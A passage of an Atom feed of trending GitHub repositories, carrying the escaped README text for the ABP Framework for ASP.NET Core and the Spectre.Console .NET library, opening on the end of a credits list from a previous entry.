Robertson&lt;/a&gt; for &lt;a href=&#34;https://github.com/Kevin-Robertson/Inveigh&#34;&gt;Inveigh&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/decoder_it&#34;&gt;decoder_it&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/splinter_code&#34;&gt;splinter_code&lt;/a&gt; for &lt;a href=&#34;https://github.com/antonioCoco/RemotePotato0&#34;&gt;RemotePotato0&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>abpframework/abp</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/abpframework/abp</id>
    <link href="https://github.com/abpframework/abp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Open Source Web Application Framework for ASP.NET Core&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ABP Framework&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://img.shields.io/github/workflow/status/abpframework/abp/build%20and%20test/dev?style=flat-square&#34; alt=&#34;build and test&#34;&gt; &lt;a href=&#34;https://codecov.io/gh/abpframework/abp&#34;&gt;&lt;img src=&#34;https://codecov.io/gh/abpframework/abp/branch/dev/graph/badge.svg?token=jUKLCxa6HF&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Volo.Abp.Core&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Volo.Abp.Core.svg?style=flat-square&#34; alt=&#34;NuGet&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Volo.Abp.Core&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/vpre/Volo.Abp.Core.svg?style=flat-square&#34; alt=&#34;NuGet (with prereleases)&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Nightly-Builds&#34;&gt;&lt;img src=&#34;https://img.shields.io/myget/abp-nightly/vpre/Volo.Abp.svg?style=flat-square&#34; alt=&#34;MyGet (nightly builds)&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/Volo.Abp.Core&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Volo.Abp.Core.svg?style=flat-square&#34; alt=&#34;NuGet Download&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://discord.gg/abp&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/951497912645476422?label=Discord&#34; alt=&#34;ABP Discord server&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;ABP Framework is a complete &lt;strong&gt;infrastructure&lt;/strong&gt; based on the &lt;strong&gt;ASP.NET Core&lt;/strong&gt; to create &lt;strong&gt;modern web applications&lt;/strong&gt; and &lt;strong&gt;APIs&lt;/strong&gt; by following the software development &lt;strong&gt;best practices&lt;/strong&gt; and the &lt;strong&gt;latest technologies&lt;/strong&gt;. Check out &lt;a href=&#34;https://abp.io&#34;&gt;https://abp.io&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Tutorials/Todo/Index&#34;&gt;Quick Start&lt;/a&gt; is a single-part, quick-start tutorial to build a simple application with the ABP Framework. Start with this tutorial if you want to quickly understand how ABP works.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Getting-Started&#34;&gt;Getting Started guide&lt;/a&gt; can be used to create and run ABP based solutions with different options and details.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Tutorials/Part-1&#34;&gt;Web Application Development Tutorial&lt;/a&gt; is a complete tutorial to develop a full stack web application with all aspects of a real-life solution.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Quick Start&lt;/h3&gt; &#xA;&lt;p&gt;Install the ABP CLI:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; dotnet tool install -g Volo.Abp.Cli&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Create a new solution:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;gt; abp new BookStore -u mvc -d ef&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;See the &lt;a href=&#34;https://docs.abp.io/en/abp/latest/CLI&#34;&gt;CLI documentation&lt;/a&gt; for all available options.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;UI Framework Options&lt;/h3&gt; &#xA;&lt;img width=&#34;500&#34; src=&#34;https://raw.githubusercontent.com/abpframework/abp/dev/docs/en/images/ui-options.png&#34;&gt; &#xA;&lt;h3&gt;Database Provider Options&lt;/h3&gt; &#xA;&lt;img width=&#34;500&#34; src=&#34;https://raw.githubusercontent.com/abpframework/abp/dev/docs/en/images/db-options.png&#34;&gt; &#xA;&lt;h2&gt;What ABP Provides?&lt;/h2&gt; &#xA;&lt;p&gt;ABP provides a &lt;strong&gt;full stack developer experience&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Architecture&lt;/h3&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/abpframework/abp/dev/docs/en/images/ddd-microservice-simple.png&#34;&gt; &#xA;&lt;p&gt;ABP offers a complete, &lt;strong&gt;modular&lt;/strong&gt; and &lt;strong&gt;layered&lt;/strong&gt; software architecture based on &lt;strong&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Domain-Driven-Design&#34;&gt;Domain Driven Design&lt;/a&gt;&lt;/strong&gt; principles and patterns. It also provides the necessary infrastructure and guiding to &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Domain-Driven-Design-Implementation-Guide&#34;&gt;implement this architecture&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;ABP Framework is suitable for &lt;strong&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Microservice-Architecture&#34;&gt;microservice solutions&lt;/a&gt;&lt;/strong&gt; as well as monolithic applications.&lt;/p&gt; &#xA;&lt;h3&gt;Infrastructure&lt;/h3&gt; &#xA;&lt;p&gt;There are a lot of features provided by the ABP Framework to achieve real world scenarios easier, like &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Event-Bus&#34;&gt;Event Bus&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Background-Jobs&#34;&gt;Background Job System&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Audit-Logging&#34;&gt;Audit Logging&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Blob-Storing&#34;&gt;BLOB Storing&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Data-Seeding&#34;&gt;Data Seeding&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Data-Filtering&#34;&gt;Data Filtering&lt;/a&gt;, etc.&lt;/p&gt; &#xA;&lt;h3&gt;Cross Cutting Concerns&lt;/h3&gt; &#xA;&lt;p&gt;ABP also simplifies (and even automates wherever possible) cross cutting concerns and common non-functional requirements like &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Exception-Handling&#34;&gt;Exception Handling&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Validation&#34;&gt;Validation&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Authorization&#34;&gt;Authorization&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Localization&#34;&gt;Localization&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Caching&#34;&gt;Caching&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Dependency-Injection&#34;&gt;Dependency Injection&lt;/a&gt;, &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Settings&#34;&gt;Setting Management&lt;/a&gt;, etc.&lt;/p&gt; &#xA;&lt;h3&gt;Application Modules&lt;/h3&gt; &#xA;&lt;p&gt;ABP is a modular framework and the Application Modules provide &lt;strong&gt;pre-built application functionalities&lt;/strong&gt;;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Modules/Account&#34;&gt;&lt;strong&gt;Account&lt;/strong&gt;&lt;/a&gt;: Provides UI for the account management and allows user to login/register to the application.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Modules/Identity&#34;&gt;Identity&lt;/a&gt;&lt;/strong&gt;: Manages organization units, roles, users and their permissions, based on the Microsoft Identity library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Modules/OpenIddict&#34;&gt;&lt;strong&gt;OpenIddict&lt;/strong&gt;&lt;/a&gt;: Integrates to OpenIddict.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Modules/Tenant-Management&#34;&gt;&lt;strong&gt;Tenant Management&lt;/strong&gt;&lt;/a&gt;: Manages tenants for a &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Multi-Tenancy&#34;&gt;multi-tenant&lt;/a&gt; (SaaS) application.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Modules/Index&#34;&gt;Application Modules&lt;/a&gt; document for all pre-built modules.&lt;/p&gt; &#xA;&lt;h3&gt;Startup Templates&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Startup-Templates/Index&#34;&gt;Startup templates&lt;/a&gt; are pre-built Visual Studio solution templates. You can create your own solution based on these templates to &lt;strong&gt;immediately start your development&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;ABP Community&lt;/h2&gt; &#xA;&lt;h3&gt;ABP Community Web Site&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://community.abp.io/&#34;&gt;ABP Community&lt;/a&gt; is a website to publish &lt;strong&gt;articles&lt;/strong&gt; and share &lt;strong&gt;knowledge&lt;/strong&gt; about the ABP Framework. You can also create content for the community!&lt;/p&gt; &#xA;&lt;h3&gt;Blog&lt;/h3&gt; &#xA;&lt;p&gt;Follow the &lt;a href=&#34;https://blog.abp.io/&#34;&gt;ABP Blog&lt;/a&gt; to learn the latest happenings in the ABP Framework.&lt;/p&gt; &#xA;&lt;h3&gt;Samples&lt;/h3&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Samples/Index&#34;&gt;sample projects&lt;/a&gt; built with the ABP Framework.&lt;/p&gt; &#xA;&lt;h3&gt;Want to Contribute?&lt;/h3&gt; &#xA;&lt;p&gt;ABP is a community-driven open source project. See &lt;a href=&#34;https://docs.abp.io/en/abp/latest/Contribution/Index&#34;&gt;the contribution guide&lt;/a&gt; if you want to be a part of this project.&lt;/p&gt; &#xA;&lt;h2&gt;Official Links&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://abp.io/&#34; target=&#34;_blank&#34;&gt;Main Web Site&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://abp.io/get-started&#34; target=&#34;_blank&#34;&gt;Get Started&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://abp.io/features&#34; target=&#34;_blank&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.abp.io/&#34; target=&#34;_blank&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.abp.io/en/abp/latest/Samples/Index&#34; target=&#34;_blank&#34;&gt;Samples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.abp.io/&#34; target=&#34;_blank&#34;&gt;Blog&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://community.abp.io/&#34; target=&#34;_blank&#34;&gt;Community&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/tagged/abp&#34; target=&#34;_blank&#34;&gt;Stack&amp;nbsp;overflow&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/abpframework&#34; target=&#34;_blank&#34;&gt;Twitter&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Support the ABP Framework&lt;/h2&gt; &#xA;&lt;p&gt;Love ABP Framework? &lt;strong&gt;Please give a star&lt;/strong&gt; to this repository &lt;span&gt;⭐&lt;/span&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Discord Channel&lt;/h2&gt; &#xA;&lt;p&gt;You can use this link to join the ABP Community Discord Server: &lt;a href=&#34;https://discord.gg/abp&#34;&gt;https://discord.gg/abp&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;ABP Commercial&lt;/h2&gt; &#xA;&lt;p&gt;See also &lt;a href=&#34;https://commercial.abp.io/&#34;&gt;ABP Commercial&lt;/a&gt; if you are looking for pre-built application modules, professional themes, code generation tooling and premium support for the ABP Framework.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>spectreconsole/spectre.console</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/spectreconsole/spectre.console</id>
    <link href="https://github.com/spectreconsole/spectre.console" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A .NET library that makes it easier to create beautiful console applications.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;code&gt;Spectre.Console&lt;/code&gt;&lt;/h1&gt; &#xA;&lt;p&gt;&lt;em&gt;&lt;a href=&#34;https://www.nuget.org/packages/spectre.console&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/spectre.console.svg?style=flat&amp;amp;label=NuGet%3A%20Spectre.Console&#34; alt=&#34;Spectre.Console NuGet Version&#34;&gt;&lt;/a&gt;&lt;/em&gt; &lt;a href=&#34;https://app.netlify.com/sites/spectreconsole/deploys&#34;&gt;&lt;img src=&#34;https://api.netlify.com/api/v1/badges/1eaf215a-eb9c-45e4-8c64-c90b62963149/deploy-status&#34; alt=&#34;Netlify Status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A .NET 5/.NET Standard 2.0 library that makes it easier to create beautiful, cross platform, console applications.&lt;br&gt; It is heavily inspired by the excellent &lt;a href=&#34;https://github.com/willmcgugan/rich&#34;&gt;Rich library&lt;/a&gt; for Python.&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/spectreconsole/spectre.console/main/#features&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/spectreconsole/spectre.console/main/#installing&#34;&gt;Installing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/spectreconsole/spectre.console/main/#documentation&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/spectreconsole/spectre.console/main/#examples&#34;&gt;Examples&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/spectreconsole/spectre.console/main/#sponsors&#34;&gt;Sponsors&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/spectreconsole/spectre.console/main/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Written with unit testing in mind.&lt;/li&gt; &#xA; &lt;li&gt;Supports tables, grids, panels, and a &lt;a href=&#34;https://github.com/willmcgugan/rich&#34;&gt;rich&lt;/a&gt; inspired markup language.&lt;/li&gt; &#xA; &lt;li&gt;Supports the most common SRG parameters when it comes to text styling such as bold, dim, italic, underline, strikethrough, and blinking text.&lt;/li&gt; &#xA; &lt;li&gt;Supports 3/4/8/24-bit colors in the terminal.&lt;br&gt; The library will detect the capabilities of the current terminal and downgrade colors as needed.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/spectreconsole/spectre.console/main/docs/input/assets/images/example.png&#34; alt=&#34;Example&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Installing&lt;/h2&gt; &#xA;&lt;p&gt;The fastest way of getting started using &lt;code&gt;Spectre.Console&lt;/code&gt; is to install the NuGet package.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-csharp&#34;&gt;dotnet add package Spectre.Console&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;The documentation for &lt;code&gt;Spectre.Console&lt;/code&gt; can be found at &lt;a href=&#34;https://spectreconsole.net/&#34;&gt;https://spectreconsole.net/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;p&gt;To see &lt;code&gt;Spectre.Console&lt;/code&gt; in action, install the &lt;a href=&#34;https://github.com/patriksvensson/dotnet-example&#34;&gt;dotnet-example&lt;/a&gt; global tool.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; dotnet tool restore&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now you can list available examples in this repository:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; dotnet example&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And to run an example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; dotnet example tables&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Sponsors&lt;/h2&gt; &#xA;&lt;p&gt;The following people are &lt;a href=&#34;https://github.com/sponsors/patriksvensson&#34;&gt;sponsoring&lt;/a&gt; Spectre.Console to show their support and to ensure the longevity of the project.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/RLittlesII&#34;&gt;Rodney Littles II&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bjorkstromm&#34;&gt;Martin Björkström&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/daveaglick&#34;&gt;Dave Glick&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/kimgunnarsson&#34;&gt;Kim Gunanrsson&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/andymac4182&#34;&gt;Andrew McClenaghan&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/augustoproiete&#34;&gt;C. Augusto Proiete&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/vktr&#34;&gt;Viktor Elofsson&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/stevenknox&#34;&gt;Steven Knox&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dpen2000&#34;&gt;David Pendray&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/elmahio&#34;&gt;Elmah.io&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;I really appreciate it.&lt;br&gt; &lt;strong&gt;Thank you very much!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Copyright © Patrik Svensson, Phil Scott, Nils Andresen&lt;/p&gt; &#xA;&lt;p&gt;Spectre.Console is provided as-is under the MIT license. For more information see LICENSE.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;For SixLabors.ImageSharp, see &lt;a href=&#34;https://github.com/SixLabors/ImageSharp/raw/master/LICENSE&#34;&gt;https://github.com/SixLabors/ImageSharp/blob/master/LICENSE&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>